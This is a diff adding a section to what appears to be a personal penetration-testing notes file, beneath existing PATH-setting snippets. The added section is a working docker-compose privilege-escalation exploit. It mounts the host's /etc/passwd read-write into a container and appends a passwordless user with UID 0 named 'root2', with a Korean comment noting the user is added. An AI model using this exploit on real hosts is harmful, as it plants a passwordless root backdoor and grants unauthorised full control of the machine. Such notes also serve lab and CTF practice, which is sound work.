@@ -124,3 +124,19 @@ set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;
 ```bash
 export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
 ```
+---
+# docker-compose.yaml exploit
+```bash
+#cat docker-compose.yaml
+version: "3.8"
+
+services:
+  suidbash:
+    image: ubuntu:latest
+    container_name: suid_bash_container
+    volumes:
+      - /etc/passwd:/mnt/passwd:rw
+    entrypoint: ["/bin/bash", "-c", "echo 'root2::0:0::/root:/bin/bash' >> /mnt/passwd && tail -f /dev/null"]
+    tty: true
+```
+- root2 유저 추가
